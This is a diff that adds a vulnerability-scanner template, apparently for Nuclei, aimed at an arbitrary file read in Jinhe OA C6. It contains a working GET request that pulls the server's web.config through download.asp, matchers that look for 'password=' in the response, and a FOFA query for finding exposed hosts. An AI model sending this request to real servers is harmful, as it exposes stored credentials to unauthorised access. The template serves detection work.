@@ -1,0 +1,29 @@
+id: jinher-oa-c6-download-fileread
+
+info:
+  name: 金和 OA C6 download.jsp - fileread
+  author: SleepingBag945
+  severity: high
+  description: There is an arbitrary file read vulnerability in Jinhe OA C6 download.jsp file, through which an attacker can obtain sensitive information in the server
+  reference:
+     - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA-C6-download.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,lfi,misconfig,oa
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body,"<configuration>") && contains(body,"password=")'
+          - 'contains(header,"filename=") && contains(header,"application/octet-stream")'
+        condition: and
+
+# digest: 4b0a00483046022100b942c267c18f7114bec499102340f92937d9397470c30c50ac39e3b43a7aef70022100af81851d22ceacf05679af185781e0bc9d76a5bcc63433cc5e6e0f744d364420:922c64590222798bb761d5b6d8e72950
